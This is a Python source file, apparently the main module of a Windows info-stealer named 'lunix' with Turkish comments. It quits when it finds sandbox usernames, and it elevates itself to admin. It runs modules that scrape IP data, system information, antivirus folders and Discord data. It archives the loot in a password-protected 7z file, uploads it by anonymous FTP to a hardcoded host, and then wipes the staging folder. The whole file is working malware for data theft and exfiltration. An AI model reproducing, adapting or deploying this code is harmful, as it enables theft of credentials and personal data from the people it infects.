import threading
import time
import sys
import os
import ctypes
import getpass
import py7zr
import shutil
from datetime import datetime
from pathlib import Path
from ftplib import FTP, error_perm

# Scraper'ları import et
import utils.ipdata as ipdata
import utils.msinfo as msinfo
import utils.antivirus as antivirus
import utils.discord as discord

blacklistUsers = ['WDAGUtilityAccount', 'test', 'Guest', 'DefaultAccount']
username = getpass.getuser()

if username.lower() in blacklistUsers:
    os._exit(0)

antivirus_folders = [
    "C:\\Program Files",
    "C:\\Program Files (x86)",
    os.path.expandvars(r"C:\Users\%USERNAME%\AppData\Local"),
    os.path.expandvars(r"C:\Users\%USERNAME%\AppData\Roaming"),
]

# Log dosyası
log_file = os.path.join(os.path.expandvars("%temp%"), "lunix.log")

def write_log(message: str):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"{timestamp} {message}\n")
    except:
        pass  # Log yazılamazsa göz ardı et

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        try:
            script = os.path.abspath(sys.argv[0])
            params = ' '.join([script] + sys.argv[1:])
            ret = ctypes.windll.shell32.ShellExecuteW(
                None, 
                "runas", 
                sys.executable, 
                params, 
                None, 
                1  # SW_SHOW
            )
            if ret <= 32:
                raise Exception(f"ShellExecute failed with code {ret}")
            sys.exit(0)
        except Exception as e:
            write_log(f"Yönetici izinleri alınamadı - {e}")
            time.sleep(3)
            sys.exit(1)

def run_scraper(func):
    result = [None]
    def wrapper():
        try:
            result[0] = func()
        except Exception as e:
            write_log(f"Scraper {func.__name__} hata: {e}")
    thread = threading.Thread(target=wrapper)
    thread.start()
    thread.join(timeout=300)
    while thread.is_alive():
        time.sleep(1)
    return result[0]

def zip_temp_folder():
    global zip_abs_path
    temp_path = os.path.expandvars(rf"C:\Users\{username}\AppData\Local\Temp\lunix")  # sadece lunix klasörü
    if not os.path.exists(temp_path):
        write_log(f"Temp lunix klasörü bulunamadı: {temp_path}")
        return

    current_time = datetime.now().strftime('%H_%M_%S')
    zip_name = f"{username}_{current_time}.7z"
    zip_abs_path = os.path.join(os.path.expandvars("%temp%"), zip_name)

    try:
        with py7zr.SevenZipFile(zip_abs_path, 'w', password=zip_name) as archive:
            archive.writeall(temp_path, arcname='lunix')
        write_log(f"Arşivleme tamamlandı: {zip_abs_path}")
    except Exception as e:
        write_log(f"Arşivleme başarısız: {e}")

def ftp_upload():
    ip = "192.168.1.103"
    port = 21
    passive = True
    timeout = 10
    try:
        if not os.path.isabs(zip_abs_path) or not os.path.isfile(zip_abs_path):
            write_log(f"Dosya bulunamadı: {zip_abs_path}")
            return
        ftp = FTP()
        ftp.connect(ip, port, timeout=timeout)
        ftp.set_pasv(passive)
        ftp.login('anonymous', 'anonymous@')
        with open(zip_abs_path, 'rb') as f:
            ftp.storbinary(f'STOR {os.path.basename(zip_abs_path)}', f)
        ftp.quit()
        write_log("FTP yükleme tamamlandı.")
    except Exception as e:
        write_log(f"FTP yükleme hatası: {e}")
        try:
            ftp.close()
        except:
            pass

def main():
    run_as_admin()

    try:
        run_scraper(ipdata.run_ipdata)
        run_scraper(msinfo.run_msinfo_scraper)
        run_scraper(lambda: antivirus.main(folders_to_scan=antivirus_folders, clear_logs=True, max_dirs_per_root=None))
        run_scraper(discord.main)
    except Exception as e:
        write_log(f"Scraper genel hata: {e}")

    time.sleep(2)
    zip_temp_folder()
    ftp_upload()
    
    temp_path = os.path.expandvars(rf"C:\Users\{username}\AppData\Local\Temp\lunix")
    # Temp temizleme
    try:
        for f in Path(temp_path).iterdir():
            if f.is_dir():
                shutil.rmtree(f, ignore_errors=True)
            else:
                f.unlink(missing_ok=True)
        write_log("Temp klasörü temizlendi.")
    except Exception as e:
        write_log(f"Temp temizleme hatası: {e}")

    write_log("İşlem tamamlandı.")

if __name__ == "__main__":
    main()